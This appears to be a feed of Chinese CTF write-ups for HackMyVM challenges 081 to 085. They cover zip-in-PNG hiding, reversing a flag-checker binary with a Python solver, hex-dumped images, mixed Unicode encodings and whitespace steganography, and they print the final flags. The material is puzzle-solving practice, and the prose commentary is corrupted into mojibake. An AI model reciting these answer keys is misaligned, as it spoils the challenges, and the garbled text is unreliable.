7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3032 bytes (3 KiB)

Extracting archive: 085.zip
--
Path = 085.zip
Type = zip
Physical Size = 3032

Everything is Ok

Size:       2923
Compressed: 3032
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd 085 
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/085]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 7
drwxr-xr-x 1 kali kali    0  8Êúà 2Êó• 22:23 .
drwxr-xr-x 1 kali kali 4096  8Êúà 2Êó• 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024Âπ¥ 9Êúà29Êó• flag.png
```

flag.pngÊ≤°ÊúâÂèØÊòæÁ§∫ÁöÑÂÜÖÂÆπ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/085]
‚îî‚îÄ$ exiftool flag.png 
ExifTool Version Number         : 13.25
File Name                       : flag.png
Directory                       : .
File Size                       : 2.9 kB
File Modification Date/Time     : 2024:09:29 08:11:46-04:00
File Access Date/Time           : 2025:08:02 22:23:20-04:00
File Inode Change Date/Time     : 2024:09:29 08:11:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0
Zip Compression                 : None
Zip Modify Date                 : 2024:09:14 23:42:20
Zip CRC                         : 0x00000000
Zip Compressed Size             : 0
Zip Uncompressed Size           : 0
Zip File Name                   : hidden/
Warning                         : [minor] Use the Duplicates option to extract tags for all 2 files
```

ÈÇ£Áõ¥Êé•Ëß£Âéã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/085]
‚îî‚îÄ$ 7z x flag.png     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2923 bytes (3 KiB)

Extracting archive: flag.png
--
Path = flag.png
Type = zip
Physical Size = 2923

Everything is Ok

Folders: 1
Files: 1
Size:       2784
Compressed: 2923
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/085]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 7
drwxr-xr-x 1 kali kali    0 2025Âπ¥ 8Êúà 2Êó• .
drwxr-xr-x 1 kali kali 4096  8Êúà 2Êó• 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024Âπ¥ 9Êúà29Êó• flag.png
drwxr-xr-x 1 kali kali    0 2024Âπ¥ 9Êúà14Êó• hidden
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/085]
‚îî‚îÄ$ cd hidden 
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/x/tmp/085/hidden]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 3
drwxr-xr-x 1 kali kali    0 2024Âπ¥ 9Êúà14Êó• .
drwxr-xr-x 1 kali kali    0  8Êúà 2Êó• 22:26 ..
-rwxr-xr-x 1 kali kali 2784 2024Âπ¥ 9Êúà14Êó• flag.png
```

![image-20250803102641124](http://7r1UMPHK.github.io/image/20250803102641231.webp)

```
HMV{F0r3N51C_3xP3rT_1N_7H3_R00M}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20085.html</guid><pubDate>Wed, 06 Aug 2025 00:39:51 +0000</pubDate></item><item><title>Challenge 084</title><link>https://7r1UMPHK.github.io/post/Challenge%20084.html</link><description>![image-20250803100714272](http://7r1UMPHK.github.io/image/20250803100714514.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 084.zip -o084

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 414206 bytes (405 KiB)

Extracting archive: 084.zip
--
Path = 084.zip
Type = zip
Physical Size = 414206

Everything is Ok

Files: 2
Size:       1051168
Compressed: 414206
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd 084 
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/084]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 1031
drwxr-xr-x 1 kali kali       0  8Êúà 2Êó• 22:07 .
drwxr-xr-x 1 kali kali    4096  8Êúà 2Êó• 22:07 ..
-rwxr-xr-x 1 kali kali   16224 2024Âπ¥ 9Êúà26Êó• hmv-012
-rwxr-xr-x 1 kali kali 1034944 2024Âπ¥ 9Êúà26Êó• hmv-012-static

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/084]
‚îî‚îÄ$ ./hmv-012-static      
Enter the flag: xxoo
Incorrect flag.
```

ÂèçÁºñËØë

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // eax
  int i; // [rsp+Ch] [rbp-74h]
  int v6; // [rsp+10h] [rbp-70h]
  int v7; // [rsp+14h] [rbp-6Ch]
  int v8; // [rsp+18h] [rbp-68h]
  int v9; // [rsp+1Ch] [rbp-64h]
  int v10; // [rsp+20h] [rbp-60h]
  int v11; // [rsp+24h] [rbp-5Ch]
  int v12; // [rsp+28h] [rbp-58h]
  int v13; // [rsp+2Ch] [rbp-54h]
  int v14; // [rsp+30h] [rbp-50h]
  int v15; // [rsp+34h] [rbp-4Ch]
  int v16; // [rsp+38h] [rbp-48h]
  int v17; // [rsp+3Ch] [rbp-44h]
  int v18; // [rsp+40h] [rbp-40h]
  int v19; // [rsp+44h] [rbp-3Ch]
  int v20; // [rsp+48h] [rbp-38h]
  char s1[24]; // [rsp+60h] [rbp-20h] BYREF
  unsigned __int64 v22; // [rsp+78h] [rbp-8h]

  v22 = __readfsqword(0x28u);
  printf('Enter the flag: ');
  __isoc99_scanf('%20s', s1);
  for ( i = 0; i &lt;= 19; ++i )
    *(&amp;v6 + i) = s1[i];
  if ( !strcmp(s1, 'HMV{StringsAgain?}') )
  {
    print_hint();
    return 0;
  }
  else
  {
    if ( v6 == 72
      &amp;&amp; (v4 = 8 * v7, LOBYTE(v4) = (8 * v7) ^ 0x90, (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763)
      &amp;&amp; ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096
      &amp;&amp; ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379
      &amp;&amp; v10 == 90
      &amp;&amp; ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267
      &amp;&amp; ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143
      &amp;&amp; v13 == 79
      &amp;&amp; ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648
      &amp;&amp; v15 == 95
      &amp;&amp; ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957
      &amp;&amp; ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068
      &amp;&amp; v18 == 103
      &amp;&amp; ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398
      &amp;&amp; ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595 )
    {
      puts('Congratulations! This is the correct flag.');
    }
    else
    {
      puts('Incorrect flag.');
    }
    return 0;
  }
}
```

ËøõÂéªprint_hintÂáΩÊï∞Áúã‰∫ÜÁúºÔºåHMV{StringsAgain?}ÊòØÂÅáflag

ÂÜô‰∏™pyÁÆó‰∏Ä‰∏ã

```python
def slv_v7():
    for i in range(32, 127):
        v7 = i
        v4_temp = 8 * v7
        v4 = (v4_temp &amp; 0xFFFFFF00) | ((v4_temp &amp; 0xFF) ^ 0x90)
        if (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763:
            return chr(i)

def slv_v8():
    for i in range(32, 127):
        v8 = i
        if ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096:
            return chr(i)

def slv_v9():
    for i in range(32, 127):
        v9 = i
        if ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379:
            return chr(i)

def slv_v11():
    for i in range(32, 127):
        v11 = i
        if ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267:
            return chr(i)

def slv_v12():
    for i in range(32, 127):
        v12 = i
        if ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143:
            return chr(i)

def slv_v14():
    for i in range(32, 127):
        v14 = i
        if ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648:
            return chr(i)

def slv_v16():
    for i in range(32, 127):
        v16 = i
        if ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957:
            return chr(i)

def slv_v17():
    for i in range(32, 127):
        v17 = i
        if ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068:
            return chr(i)

def slv_v19():
    for i in range(32, 127):
        v19 = i
        if ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398:
            return chr(i)

def slv_v20():
    for i in range(32, 127):
        v20 = i
        if ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595:
            return chr(i)

if __name__ == '__main__':
    flag = ['' for _ in range(15)]
    
    flag[0] = 'H'
    flag[1] = slv_v7()
    flag[2] = slv_v8()
    flag[3] = slv_v9()
    flag[4] = 'Z'
    flag[5] = slv_v11()
    flag[6] = slv_v12()
    flag[7] = 'O'
    flag[8] = slv_v14()
    flag[9] = '_'
    flag[10] = slv_v16()
    flag[11] = slv_v17()
    flag[12] = 'g'
    flag[13] = slv_v19()
    flag[14] = slv_v20()
    
    print(''.join(flag))
```

flag

```bash
HMV{Z0nl_bigt}
```



sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20084.html</guid><pubDate>Wed, 06 Aug 2025 00:39:35 +0000</pubDate></item><item><title>Challenge 083</title><link>https://7r1UMPHK.github.io/post/Challenge%20083.html</link><description>![image-20250803095854556](http://7r1UMPHK.github.io/image/20250803095903114.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 083.zip -o083

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 804934 bytes (787 KiB)

Extracting archive: 083.zip
--
Path = 083.zip
Type = zip
Physical Size = 804934

Everything is Ok

Size:       1516128
Compressed: 804934
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd 083
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/083]
‚îî‚îÄ$ ls -al                
ÊÄªËÆ° 1485
drwxr-xr-x 1 kali kali       0  8Êúà 2Êó• 21:59 .
drwxr-xr-x 1 kali kali    4096  8Êúà 2Êó• 21:59 ..
-rwxr-xr-x 1 kali kali 1516128 2024Âπ¥ 8Êúà26Êó• secret

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/083]
‚îî‚îÄ$ head -n 10 secret 
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0271 0000 0190 0806 0000 00c1 7d36  ...q..........}6
00000020: 8200 0020 0049 4441 5478 5eec 9d07 9c5d  ... .IDATx^....]
00000030: 45d5 c067 b37d d37b af84 2484 2420 bd08  E..g.}.{..$.$ ..
00000040: 0888 0554 1450 143f ac88 8a15 6cd8 150b  ...T.P.?....l...
00000050: 62c3 aea8 8852 6c54 7b41 102c 8080 0212  b....RlT{A.,....
00000060: 0221 a186 12d2 7bd9 92fd ceff dc77 36b3  .!....{......w6.
00000070: 93b9 77ee ee4b 4854 1ebf b0bb efde 3b77  ..w..KHT......;w
00000080: ea99 ff9c 73e6 4ccd 9f7f 7c6e e7c6 8d1b  ....s.L...|n....
00000090: ddf0 e1c3 dd9d 77de e996 2e5f e6c6 8c19  ......w...._....
```

secretÁªèËøáÊü•ÁúãÊòØxxd pngÁöÑÁªìÊûú

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/083]
‚îî‚îÄ$ xxd -r secret &gt; secret.png
```

![secret](http://7r1UMPHK.github.io/image/20250803100524026.webp)

ÂõæÁâá‰∏äÊúâ‰∏™base64

```bash
SE1We2FuY2llbnR0aW1lczE40DB9Cg==
```

ÂéªCyberChefËß£Á†Å

```bash
HMV{ancienttimes1880}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20083.html</guid><pubDate>Wed, 06 Aug 2025 00:39:21 +0000</pubDate></item><item><title>Challenge 082</title><link>https://7r1UMPHK.github.io/post/Challenge%20082.html</link><description>![image-20250803000325430](http://7r1UMPHK.github.io/image/20250803000325640.webp)

# 1. ÂàùÊ≠•ÂàÜÊûê‰∏é‰ø°ÊÅØËé∑Âèñ

È¶ñÂÖàÔºåÊàë‰ª¨ÊãøÂà∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `082.zip` ÁöÑÂéãÁº©Êñá‰ª∂„ÄÇÈÄöËøá `7z` ÂëΩ‰ª§Ëß£ÂéãÂêéÔºåÂæóÂà∞‰∏Ä‰∏™ `082.bin` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 082.zip -o82
...
Everything is Ok
```

‰ΩøÁî® `file` Âíå `ls -al` Êü•ÁúãÊñá‰ª∂‰ø°ÊÅØÔºåÁ°ÆËÆ§ÂÆÉÊòØ‰∏Ä‰∏™Â§ßÂ∞è‰ªÖ‰∏∫ 61 Â≠óËäÇÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/82]
‚îî‚îÄ$ file 082.bin
082.bin: data

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/82]
‚îî‚îÄ$ ls -al
-rwxr-xr-x 1 kali kali   61 2024Âπ¥ 4Êúà19Êó• 082.bin
```

Áõ¥Êé• `cat` Êñá‰ª∂ÔºåÂèØ‰ª•ÁúãÂà∞‰∏ÄÂ†Ü‰π±Á†ÅÔºå‰ΩÜÂÖ∂‰∏≠Â§πÊùÇÁùÄ‰∏Ä‰∫õÂèØËØÜÂà´ÁöÑ‚ÄúËä±Âºè‚ÄùÂ≠óÁ¨¶ÔºåÂπ∂‰∏îËÉΩÂãâÂº∫ÁúãÂá∫ `HMV{...}` ÁöÑÁªìÊûÑÔºåËøô‰∏éÈ¢òÁõÆÊèêÁ§∫Áõ∏Á¨¶„ÄÇ

&gt; È¢òÁõÆÊèêÁ§∫:
&gt; 8Universal 16Threads of 32Friendship. Flag format: HMV{...}
&gt; 8Universal Âä†ÂØÜÂêéÁöÑÊï∞ÊçÆ‰ª• UTF-8 ÁºñÁ†ÅÂëàÁé∞

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/82]
‚îî‚îÄ$ cat 082.bin 
‚íΩ&lt;ÔøΩ\ÔøΩÔøΩ6{ÔøΩwùï†5ÿ†ÔøΩÔøΩ5›æÔøΩÔøΩ_ùô§5ÔøΩ'ÔøΩ_5ÔøΩÔøΩùìï}
```

‰ΩøÁî® `xxd -p` ÂæóÂà∞Êñá‰ª∂ÁöÑÂÆåÊï¥ÂçÅÂÖ≠ËøõÂà∂Ë°®Á§∫ÔºåËøôÊòØÊàë‰ª¨ÂêéÁª≠ÂàÜÊûêÁöÑÂü∫Á°ÄÔºö

```bash
e292bd3cd85cddff367b0000000001d477f09d95a035d8a0ded835ddbeff
d501000000005ff09d99a435d827de005f35ff00000001d413f09d93957d
00
```

# 2. Ê†∏ÂøÉÁ™ÅÁ†¥ÔºöËØÜÂà´Ê∑∑ÂêàÁºñÁ†Å

ËøôÊòØËß£ÂºÄË∞úÈ¢òÊúÄÂÖ≥ÈîÆÁöÑ‰∏ÄÊ≠•„ÄÇÊàë‰ª¨Â∞ÜÊ≥®ÊÑèÂäõÈõÜ‰∏≠Âú®Êñá‰ª∂ÂºÄÂ§¥ÁöÑ `HMV` ÈÉ®ÂàÜ„ÄÇÈÄöËøáÂú® CyberChef Á≠âÂ∑•ÂÖ∑‰∏≠ÂèçÂ§çÂ∞ùËØïÔºåÊàë‰ª¨ÂèëÁé∞ÂÆÉÊòØÁî±Â§öÁßçÁºñÁ†ÅÊñπÂºèÊ∑∑ÂêàËÄåÊàêÁöÑÔºö

*   **H**: Áî±Â≠óËäÇ `e292bd` Ë°®Á§∫„ÄÇËøôÂú® **UTF-8** ÁºñÁ†Å‰∏ãÔºåÊ≠£Â•ΩÊòØÂ∏¶ÂúàÂ≠óÊØç `‚íΩ`„ÄÇ
*   **M**: Áî±Â≠óËäÇ `3cd85cdd` Ë°®Á§∫„ÄÇËøôÂú® **UTF-16LE** (Â∞èÁ´ØÂ∫è) ÁºñÁ†Å‰∏ãÔºåÊòØÂ∏¶ÂúàÂ≠óÊØç `üÖú`„ÄÇ
*   **V**: Áî±Â≠óËäÇ `ff36` Ë°®Á§∫„ÄÇËøôÂú® **UTF-16BE** (Â§ßÁ´ØÂ∫è) ÁºñÁ†Å‰∏ãÔºåÊòØÂÖ®ËßíÂ≠óÊØç `Ôº∂`„ÄÇ

Ëøô‰∏™ÂèëÁé∞ËØÅÂÆû‰∫ÜÈ¢òÁõÆÊèêÁ§∫ `'8Universal 16Threads of 32Friendship'` ÁöÑÂê´‰πâÔºöFlag ‰∏≠ÁöÑÂ≠óÁ¨¶Ë¢´ÊõøÊç¢‰∏∫‰∫ÜÂêÑÁßç‚ÄúËä±Âºè‚ÄùUnicode Â≠óÁ¨¶ÔºåÂπ∂‰∏îËøô‰∫õÂ≠óÁ¨¶Ëá™Ë∫´ÂèàÂàÜÂà´‰ΩøÁî®‰∫Ü UTF-8„ÄÅUTF-16 ÁîöËá≥ UTF-32 ËøõË°å‰∫ÜÁºñÁ†ÅÔºåÊúÄÂêéÊãºÊé•Âú®‰∏ÄËµ∑„ÄÇ

# 3. ÈÄê‰∏™ÂáªÁ†¥ÔºöËß£Á†Å Flag ÂÜÖÂÆπ

Êàë‰ª¨ËØÜÂà´Âá∫ `7b` ÊòØ `{` ÁöÑ ASCII Á†ÅÔºå`7d00` ‰ª£Ë°® `}`„ÄÇÊé•‰∏ãÊù•ÔºåÊàë‰ª¨ÂØπËä±Êã¨Âè∑‰∏≠Èó¥ÁöÑÊ†∏ÂøÉÊï∞ÊçÆËøõË°åÈÄê‰∏™Ëß£Á†ÅÔºö

`00000000 01d477f09d95a035d8a0ded835ddbeff d50100000000 5ff09d99a435d827de00 5f35ff00000001d413f09d9395`

ÈÄöËøáÁªÜËá¥Âú∞ÊâãÂä®ÂàÜÊÆµÂíåËß£Á†ÅÔºåÊàë‰ª¨ÊãºÂáëÂá∫ Flag ÁöÑÂêÑ‰∏™ÈÉ®ÂàÜÔºö

1.  `0001d477` -&gt; **UTF-32BE** -&gt; `ùë∑` (ÂØπÂ∫î 'p')
2.  `f09d95a0` -&gt; **UTF-8** -&gt; `ùï†` (ÂØπÂ∫î 'o')
3.  `35d8a0de` -&gt; **UTF-32LE** -&gt; `w`
4.  `d835ddbe` -&gt; **UTF-16BE** -&gt; `ùó≤` (ÂØπÂ∫î 'e')
5.  `ffd501` -&gt; **UTF-32LE** -&gt; `ùóø` (ÂØπÂ∫î 'r')
6.  `5f` -&gt; **ASCII** -&gt; `_`
7.  `f09d99a4` -&gt; **UTF-8** -&gt; `ùô§` (ÂØπÂ∫î 'o')
8.  `f09d9395` -&gt; **UTF-8** -&gt; `ùìï` (ÂØπÂ∫î 'f')
9.  `5f` -&gt; **ASCII** -&gt; `_`
10.  `35ff` -&gt; **UTF-16LE** -&gt; `Ôºµ` (ÂØπÂ∫î 'U')
11.  `0001d413`-&gt; **UTF-32BE** -&gt; `ùêì` (ÂØπÂ∫î 't')
12.  `f09d9395` -&gt; **UTF-8** -&gt; `ùìï` (ÂØπÂ∫î 'f')

# 4. ÁªìËÆ∫

ÊúÄÁªàÁöÑ Flag ÊòØÔºö

```
HMV{power_of_Utf}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20082.html</guid><pubDate>Wed, 06 Aug 2025 00:39:02 +0000</pubDate></item><item><title>Challenge 081</title><link>https://7r1UMPHK.github.io/post/Challenge%20081.html</link><description>![image-20250729212955995](http://7r1UMPHK.github.io/image/20250729212956244.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 081.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1074 bytes (2 KiB)

Extracting archive: 081.zip
--
Path = 081.zip
Type = zip
Physical Size = 1074

Everything is Ok

Size:       918
Compressed: 1074
                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat -A message.txt 
 ^I   ^I  $
  ^I^I    $
 ^I  ^I^I^I $
 ^I ^I ^I  $
 ^I ^I^I^I^I^I$
 ^I ^I ^I^I^I$
  ^I^I    $
 ^I ^I  ^I $
 ^I ^I  ^I $
 ^I ^I^I  ^I$
 ^I ^I^I^I^I^I$
 ^I   ^I^I^I$
 ^I ^I ^I ^I$
 ^I ^I^I  ^I$
  ^I^I ^I ^I$
 ^I ^I^I^I^I^I$
$
$
$
^I   $
   ^I^I$
  ^I^I ^I$
^I   $
    ^I$
^I ^I $
^I ^I$
  ^I^I ^I$
   $
^I^I^I^I^I$
^I^I^I^I^I$
^I $
^I ^I ^I^I$
  ^I^I ^I$
$
$
$
   ^I   ^I^I^I$
^I$
      ^I^I    $
^I$
     ^I ^I ^I  $
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I  ^I ^I^I$
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I^I$
^I$
      ^I^I ^I  $
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
      ^I^I    $
^I$
     ^I   ^I^I $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I  ^I^I$
^I$
      ^I^I    $
^I$
     ^I  ^I^I ^I$
^I$
     ^I   ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I $
^I$
     ^I ^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I   ^I$
^I$
     ^I  ^I^I^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I     ^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I    $
^I$
     ^I ^I ^I ^I$
^I$
     ^I  ^I^I^I $
^I$
     ^I   ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I  ^I   $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I^I ^I $
^I$
      ^I ^I  ^I$
^I$
```

ÁúãÁùÄÂÉè‰πãÂâçÈÇ£‰∏™Á©∫ÁôΩÂä†ÂØÜWhitespace

ÁªìÊûú‰∏çÊòØ.....

```bash
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ hexdump -C message.txt
00000000  20 09 20 20 20 09 20 20  0a 20 20 09 09 20 20 20  | .   .  .  ..   |
00000010  20 0a 20 09 20 20 09 09  09 20 0a 20 09 20 09 20  | . .  ... . . . |
00000020  09 20 20 0a 20 09 20 09  09 09 09 09 0a 20 09 20  |.  . . ...... . |
00000030  09 20 09 09 09 0a 20 20  09 09 20 20 20 20 0a 20  |. ....  ..    . |
00000040  09 20 09 20 20 09 20 0a  20 09 20 09 20 20 09 20  |. .  . . . .  . |
00000050  0a 20 09 20 09 09 20 20  09 0a 20 09 20 09 09 09  |. . ..  .. . ...|
00000060  09 09 0a 20 09 20 20 20  09 09 09 0a 20 09 20 09  |... .   .... . .|
00000070  20 09 20 09 0a 20 09 20  09 09 20 20 09 0a 20 20  | . .. . ..  ..  |
00000080  09 09 20 09 20 09 0a 20  09 20 09 09 09 09 09 0a  |.. . .. . ......|
00000090  0a 0a 0a 09 20 20 20 0a  20 20 20 09 09 0a 20 20  |....   .   ...  |
000000a0  09 09 20 09 0a 09 20 20  20 0a 20 20 20 20 09 0a  |.. ...   .    ..|
000000b0  09 20 09 20 0a 09 20 09  0a 20 20 09 09 20 09 0a  |. . .. ..  .. ..|
000000c0  20 20 20 0a 09 09 09 09  09 0a 09 09 09 09 09 0a  |   .............|
000000d0  09 20 0a 09 20 09 20 09  09 0a 20 20 09 09 20 09  |. .. . ...  .. .|
000000e0  0a 0a 0a 0a 20 20 20 09  20 20 20 09 09 09 0a 09  |....   .   .....|
000000f0  0a 20 20 20 20 20 20 09  09 20 20 20 20 0a 09 0a  |.      ..    ...|
00000100  20 20 20 20 20 09 20 09  20 09 20 20 0a 09 0a 20  |     . . .  ... |
00000110  20 20 20 20 09 20 09 20  09 20 20 0a 09 0a 20 20  |    . . .  ...  |
00000120  20 20 20 20 09 09 20 09  20 20 0a 09 0a 20 20 20  |    .. .  ...   |
00000130  20 20 09 20 09 09 09 09  09 0a 09 0a 20 20 20 20  |  . ........    |
00000140  20 09 20 09 20 09 20 20  0a 09 0a 20 20 20 20 20  | . . .  ...     |
00000150  20 09 09 20 09 20 20 0a  09 0a 20 20 20 20 20 09  | .. .  ...     .|
00000160  20 20 09 20 09 09 0a 09  0a 20 20 20 20 20 20 09  |  . .....      .|
00000170  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000180  09 09 09 09 0a 09 0a 20  20 20 20 20 09 20 20 20  |.......     .   |
00000190  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 20 09  | .....      .. .|
000001a0  20 20 0a 09 0a 20 20 20  20 20 09 20 09 20 20 09  |  ...     . .  .|
000001b0  20 0a 09 0a 20 20 20 20  20 20 09 09 20 20 09 09  | ...      ..  ..|
000001c0  0a 09 0a 20 20 20 20 20  09 20 09 09 09 09 09 0a  |...     . ......|
000001d0  09 0a 20 20 20 20 20 20  09 09 20 20 20 20 0a 09  |..      ..    ..|
000001e0  0a 20 20 20 20 20 09 20  20 20 09 09 20 0a 09 0a  |.     .   .. ...|
000001f0  20 20 20 20 20 09 20 09  09 09 09 09 0a 09 0a 20  |     . ........ |
00000200  20 20 20 20 09 20 09 20  20 09 09 0a 09 0a 20 20  |    . .  .....  |
00000210  20 20 20 20 09 09 20 20  20 20 0a 09 0a 20 20 20  |    ..    ...   |
00000220  20 20 09 20 20 09 09 20  09 0a 09 0a 20 20 20 20  |  .  .. ....    |
00000230  20 09 20 20 20 09 20 09  0a 09 0a 20 20 20 20 20  | .   . ....     |
00000240  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000250  20 20 20 20 09 20 0a 09  0a 20 20 20 20 20 09 20  |    . ...     . |
00000260  09 20 09 20 09 0a 09 0a  20 20 20 20 20 20 09 09  |. . ....      ..|
00000270  20 09 20 09 0a 09 0a 20  20 20 20 20 20 09 09 20  | . ....      .. |
00000280  20 20 09 0a 09 0a 20 20  20 20 20 09 20 20 09 09  |  ....     .  ..|
00000290  09 20 0a 09 0a 20 20 20  20 20 20 09 09 20 20 09  |. ...      ..  .|
000002a0  09 0a 09 0a 20 20 20 20  20 20 09 09 20 09 20 09  |....      .. . .|
000002b0  0a 09 0a 20 20 20 20 20  20 09 09 20 09 20 09 0a  |...      .. . ..|
